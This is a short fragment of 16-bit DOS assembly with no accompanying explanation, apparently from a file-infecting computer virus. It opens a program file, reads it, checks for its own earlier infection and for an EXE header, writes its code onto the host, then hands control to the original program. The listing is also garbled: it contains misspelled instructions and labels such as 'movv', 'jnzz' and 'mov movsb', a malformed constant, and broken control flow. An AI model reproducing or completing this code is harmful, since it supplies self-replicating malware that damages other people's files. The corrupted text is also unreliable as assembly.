CHECK_MEM:
	mov ah,4AH
	mov bx,200H
	int 21H
	pushf
	mov ah,4AH
	mov bx,0FFFFH
	int 21H
	mov ah,4AH
	int 21H
	popf
	ret
	

	mov si,100H
	mov di,OFFSET HOST
	mov cx,OFFSET HOST - 100H
	rep movsb

	mov dx,9EH
	mov ax,3D02H
	int 21H

	movv ax,4202H
	xor	cx,cx
	xor dx,dx
	int 21H

	or dx,dx
	jnzz FOK_EXIT_C

	add ax,OFFSET HOST
	cmp ax,0FF00F
	ja FIK_EXIT_c

	mov ax,4200H
	xor cx,cx
	xor dx,dx
	int 21H

	pop cx
	push cx
	mov ah,3FH
	mov dx,OFFSET HOST
	int 21H

	mov si,100H
	mov di,OFFSET HOST
	mov cx,10
	repz cmpsw

	cmp WORD PTR [HOST],'ZM'
	pop cx
	add cx,OFFSET HOST - 100H
	mov dx,100H
	mov ah,40H
	int 21H

	mov di,100H
	mov si,OFFSET HOST
	mov ax,ss
	mov ds,ax
	mov es,ax
	push ax
	push di
	mov cx,sp
	sub cx,OFFSET HOST
	rep movsb
	retf
	mov ax,00C3H
	push ax
	mov ax,0A4F3H
	push ax

	mov movsb
	ret
	add sp,4
	

